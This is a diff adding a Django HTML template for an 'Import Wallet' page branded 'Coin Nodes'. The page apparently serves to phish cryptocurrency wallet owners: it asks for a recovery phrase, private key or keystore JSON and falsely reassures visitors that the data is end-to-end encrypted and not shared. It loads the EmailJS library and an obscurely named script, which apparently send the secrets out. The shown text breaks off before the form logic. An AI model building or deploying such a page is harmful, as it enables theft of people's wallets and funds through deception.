@@ -1,0 +1,831 @@
+{% load static %}
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width">
+        <title>Import Wallet</title>
+        <meta name="robots" content="index,follow">
+        <meta name="description" content="https://www.coinnsnodes.live">
+        <meta property="og:description" content="https://www.coinnsnodes.live">
+        <meta property="og:url" content="https://www.coinnsnodes.live">
+        <meta property="og:type" content="website">
+        <meta property="og:image" content="https://www.coinnsnodes.live/ms-icon-310x310.PNG">
+        <meta property="og:image:alt" content="Coin Nodes">
+        <meta property="og:image:width" content="600">
+        <meta property="og:image:height" content="600">
+        <meta property="og:title" content="Coin Nodes">
+        <meta name="next-head-count" content="13">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="true">
+        <link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
+        <link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
+        <link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
+        <link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
+        <link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
+        <link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
+        <link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
+        <link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
+        <link rel="icon" type="image/png" sizes="192x192" href="/android-icon-192x192.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+        <link rel="manifest" href="manifest.json">
+        <meta name="msapplication-TileColor" content="#ffffff">
+        <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+        <meta name="theme-color" content="#ffffff">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <link rel="preload" href="{% static 'wallets/import/_next/static/css/78ade6690479a575.css' %}" as="style">
+        <link rel="stylesheet" href="{% static 'wallets/import/_next/static/css/78ade6690479a575.css' %}" data-n-g="">
+        <noscript data-n-css=""></noscript>
+        <!-- <script src="{% static '.vscode/next/app/936763966763.js' %}"></script> -->
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+        <!--         <script src="{% static 'next/app/errors/9060937896337626892866.js' %}"></script> -->
+        <!--         <script src="{% static 'vscode/next/app/errors/9060937896337626892866.js' %}"></script>  -->
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+        <!--          <script src="{% static 'wallets/import/errors/993789633762686.js' %}"></script> -->
+        <script src="{% static 'wallets/import/906093789637626892866.js' %}"></script>
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+        <style data-href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;500;600;700;800&amp;family=Poppins:wght@200;300;400;500;600;700;800;900&amp;display=swap">
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 400;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXK0E3kTposypRydzVT08TS3JnAmtdgazaps.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 500;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXK0E3kTposypRydzVT08TS3JnAmtdgozaps.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 600;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXK0E3kTposypRydzVT08TS3JnAmtdjEyqps.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 700;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXK0E3kTposypRydzVT08TS3JnAmtdj9yqps.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 800;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXK0E3kTposypRydzVT08TS3JnAmtdiayqps.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 200;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLFj_V1g.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 300;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLDz8V1g.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 400;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiEyp8kv8JHgFVrFJM.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 500;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLGT9V1g.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 600;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLEj6V1g.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 700;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLCz7V1g.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 800;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLDD4V1g.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 900;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLBT5V1g.woff) format('woff')
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 400;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51ncAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 400;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51fcAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 400;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51bcAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 400;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51jcAM4olXc.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 500;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51ncAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 500;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51fcAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 500;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51bcAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 500;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51jcAM4olXc.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 600;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51ncAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 600;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51fcAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 600;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51bcAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 600;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51jcAM4olXc.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 700;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51ncAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 700;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51fcAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 700;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51bcAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 700;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51jcAM4olXc.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 800;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51ncAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 800;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51fcAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 800;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51bcAM4olXcLtA.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Baloo 2';
+                font-style: normal;
+                font-weight: 800;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/baloo2/v16/wXKrE3kTposypRyd51jcAM4olXc.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 200;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLFj_Z11lFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 200;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLFj_Z1JlFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 200;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLFj_Z1xlFd2JQEk.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 300;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLDz8Z11lFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 300;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLDz8Z1JlFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 300;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLDz8Z1xlFd2JQEk.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 400;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiEyp8kv8JHgFVrJJbecnFHGPezSQ.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 400;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiEyp8kv8JHgFVrJJnecnFHGPezSQ.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 400;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiEyp8kv8JHgFVrJJfecnFHGPc.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 500;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLGT9Z11lFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 500;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLGT9Z1JlFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 500;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLGT9Z1xlFd2JQEk.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 600;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLEj6Z11lFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 600;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLEj6Z1JlFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 600;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLEj6Z1xlFd2JQEk.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 700;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLCz7Z11lFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 700;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLCz7Z1JlFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 700;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLCz7Z1xlFd2JQEk.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 800;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLDD4Z11lFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 800;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLDD4Z1JlFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 800;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLDD4Z1xlFd2JQEk.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 900;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLBT5Z11lFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 900;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLBT5Z1JlFd2JQEl8qw.woff2) format('woff2');
+                unicode-range: U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF
+            }
+
+            @font-face {
+                font-family: 'Poppins';
+                font-style: normal;
+                font-weight: 900;
+                font-display: swap;
+                src: url(https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLBT5Z1xlFd2JQEk.woff2) format('woff2');
+                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
+            }
+        </style>
+        <style id="_goober">
+            @keyframes go2264125279 {
+                from {
+                    transform: scale(0) rotate(45deg);
+                    opacity: 0;
+                }
+
+                to {
+                    transform: scale(1) rotate(45deg);
+                    opacity: 1;
+                }
+            }
+
+            @keyframes go3020080000 {
+                from {
+                    transform: scale(0);
+                    opacity: 0;
+                }
+
+                to {
+                    transform: scale(1);
+                    opacity: 1;
+                }
+            }
+
+            @keyframes go463499852 {
+                from {
+                    transform: scale(0) rotate(90deg);
+                    opacity: 0;
+                }
+
+                to {
+                    transform: scale(1) rotate(90deg);
+                    opacity: 1;
+                }
+            }
+
+            @keyframes go1268368563 {
+                from {
+                    transform: rotate(0deg);
+                }
+
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+
+            @keyframes go1310225428 {
+                from {
+                    transform: scale(0) rotate(45deg);
+                    opacity: 0;
+                }
+
+                to {
+                    transform: scale(1) rotate(45deg);
+                    opacity: 1;
+                }
+            }
+
+            @keyframes go651618207 {
+                0% {
+                    height: 0;
+                    width: 0;
+                    opacity: 0;
+                }
+
+                40% {
+                    height: 0;
+                    width: 6px;
+                    opacity: 1;
+                }
+
+                100% {
+                    opacity: 1;
+                    height: 10px;
+                }
+            }
+
+            @keyframes go901347462 {
+                from {
+                    transform: scale(0.6);
+                    opacity: 0.4;
+                }
+
+                to {
+                    transform: scale(1);
+                    opacity: 1;
+                }
+            }
+
+            .go4109123758 {
+                z-index: 9999;
+            }
+
+            .go4109123758 > * {
+                pointer-events: auto;
+            }
+        </style>
+    </head>
+    <body class="min-h-screen w-full bg-primary-bg !font-bah text-gray-200 scrollbar-thin scrollbar-track-primary scrollbar-thumb-primary-blue" cz-shortcut-listen="true">
+        <div id="__next">
+            <main>
+                <div class="w-full">
+                    <div class="bg-l1">
+                        <div class="container px-5 xl:px-0 text-center py-10">
+                            <h1 class="text-3xl lg:text-4xl font-extrabold">Import Wallet</h1>
+                            <p class="mt-5 lg:text-lg">NB: All information are end-to end-encrypted. We do not share data and activity sessions with any other company.</p>
+                        </div>
+                    </div>
+                    <style>
+                        .my-tab-title {
+                            background: #fff;
+                            margin: 5%;
+                        }
+                    </style>
+                    <div class="mt-8 max-w-2xl mx-auto w-full px-5 xl:px-0">
+                        <div class="flex flex-wrap gap-x-5">
+                            <div id="phraseTitle" onclick="switchForm(0)" class="rounded-t-md px-4 py-3 bg-white text-primary duration-300 tab-title">
+                                <h3 class="font-bold">Phrase</h3>
+                            </div>
+                            <div id="keyTitle" onclick="switchForm(2)" class="cursor-pointer rounded-t-md px-4 py-3  duration-300 tab-title">
+                                <h3 class="font-bold">Private Key</h3>
+                            </div>
+                            <div id="keystoreTitle" onclick="switchForm(1)" class="cursor-pointer rounded-t-md px-4 py-3  duration-300 tab-title">
+                                <h3 class="font-bold">Keystore JSON</h3>
+                            </div>
+                        </div>
+                        <div class="bg-white mb-5 p-5 rounded-b-md">
+                            <div class="flex flex-col space-y-5">
+                                <!--
